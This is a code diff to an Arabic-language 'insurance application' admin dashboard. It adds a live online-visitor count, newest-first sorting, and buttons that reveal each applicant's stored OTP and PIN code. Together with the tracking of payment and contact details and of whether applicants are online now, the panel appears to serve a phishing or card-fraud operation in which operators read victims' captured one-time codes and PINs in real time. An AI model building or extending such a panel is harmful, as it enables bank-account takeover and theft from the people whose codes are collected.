@@ -8,12 +8,15 @@ import {
   Clock,
   MessageSquare,
   User,
+  Users,
   Settings,
   Phone,
   CreditCard,
   Mail,
   Calendar,
   FileText,
+  Key,
+  Hash,
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -30,6 +33,28 @@ import {
   playSuccessSound,
   playErrorSound,
 } from "@/lib/notification-sound";
+import { database } from "@/lib/firestore";
+import { onValue, ref } from "firebase/database";
+
+function useOnlineUsersCount() {
+  const [onlineUsersCount, setOnlineUsersCount] = useState(0);
+
+  useEffect(() => {
+    const onlineUsersRef = ref(database, "status");
+    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
+      const data = snapshot.val();
+      if (data) {
+        const onlineCount = Object.values(data).filter(
+          (status: any) => status.state === "online"
+        ).length;
+        setOnlineUsersCount(onlineCount);
+      }
+    });
+    return () => unsubscribe();
+  }, []);
+
+  return onlineUsersCount;
+}
 
 export default function AdminDashboard() {
   const [applications, setApplications] = useState<InsuranceApplication[]>([]);
@@ -43,6 +68,9 @@ export default function AdminDashboard() {
   const [showChat, setShowChat] = useState(false);
   const [loading, setLoading] = useState(true);
   const prevApplicationsCount = useRef<number>(0);
+  const onlineUsersCount = useOnlineUsersCount();
+  const [showOtp, setShowOtp] = useState<string | null>(null);
+  const [showPin, setShowPin] = useState<string | null>(null);
 
   const stats = useMemo(() => {
     return {
@@ -89,8 +117,14 @@ export default function AdminDashboard() {
         );
       }
 
+      filtered = [...filtered].sort((a, b) => {
+        const dateA = a.createdAt ? new Date(a.createdAt).getTime() : 0;
+        const dateB = b.createdAt ? new Date(b.createdAt).getTime() : 0;
+        return dateB - dateA;
+      });
+
       setFilteredApplications(filtered);
-    }, 300); // 300ms debounce
+    }, 300);
 
     return () => clearTimeout(timer);
   }, [applications, searchQuery, statusFilter]);
@@ -260,6 +294,13 @@ export default function AdminDashboard() {
                 {stats.rejected}
               </span>
             </div>
+            <div className="flex items-center gap-2 mr-auto">
+              <Users className="w-4 h-4 text-emerald-500" />
+              <span className="text-slate-600">المتصلين الآن</span>
+              <span className="font-semibold text-emerald-600">
+                {onlineUsersCount}
+              </span>
+            </div>
           </div>
         </div>
       </div>
@@ -404,6 +445,38 @@ export default function AdminDashboard() {
                       </span>
                     )}
                   </div>
+                  {(app.otp || app.pinCode) && (
+                    <div className="flex gap-2 mt-3">
+                      {app.otp && (
+                        <Button
+                          variant="outline"
+                          size="sm"
+                          className="h-7 text-xs gap-1.5 bg-amber-50 border-amber-200 text-amber-700 hover:bg-amber-100"
+                          onClick={(e) => {
+                            e.stopPropagation();
+                            setShowOtp(showOtp === app.id ? null : app.id!);
+                          }}
+                        >
+                          <Key className="w-3 h-3" />
+                          {showOtp === app.id ? app.otp : "عرض OTP"}
+                        </Button>
+                      )}
+                      {app.pinCode && (
+                        <Button
+                          variant="outline"
+                          size="sm"
+                          className="h-7 text-xs gap-1.5 bg-purple-50 border-purple-200 text-purple-700 hover:bg-purple-100"
+                          onClick={(e) => {
+                            e.stopPropagation();
+                            setShowPin(showPin === app.id ? null : app.id!);
+                          }}
+                        >
+                          <Hash className="w-3 h-3" />
+                          {showPin === app.id ? app.pinCode : "عرض PIN"}
+                        </Button>
+                      )}
+                    </div>
+                  )}
                   {!app.online && app.lastSeen && (
                     <div className="mt-2 text-xs text-slate-400">
                       آخر ظهور: {formatArabicDate(app.lastSeen)}
